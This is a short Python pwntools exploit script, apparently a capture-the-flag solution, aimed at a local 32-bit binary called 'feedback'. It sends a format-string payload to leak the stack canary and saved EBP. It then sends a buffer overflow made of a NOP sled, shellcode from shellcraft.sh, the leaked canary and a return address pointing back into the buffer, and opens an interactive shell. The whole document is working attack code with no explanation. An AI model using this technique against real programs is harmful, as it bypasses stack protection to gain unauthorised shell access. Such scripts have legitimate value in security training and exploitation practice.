#!/usr/bin/python

from pwn import *
context.update(os = 'linux', arch = 'i386')

p = process('./feedback')
# "Enter name..."
p.read()
p.sendline('%x'*30+'.%x'*4)

leak = p.readline()

canary = int(leak.split('.')[1], 16)
log.success('Canary: '+hex(canary))

saved_ebp = int(leak.split('.')[-1], 16)
log.success('Saved EBP: '+hex(saved_ebp))

buf = saved_ebp-572
shellcode = asm(shellcraft.sh())
p.send('\x90'*100+shellcode+'\x90'*(0x210-100-len(shellcode))+p32(canary)+'\x90'*8+p32(saved_ebp)+p32(buf))

p.interactive()
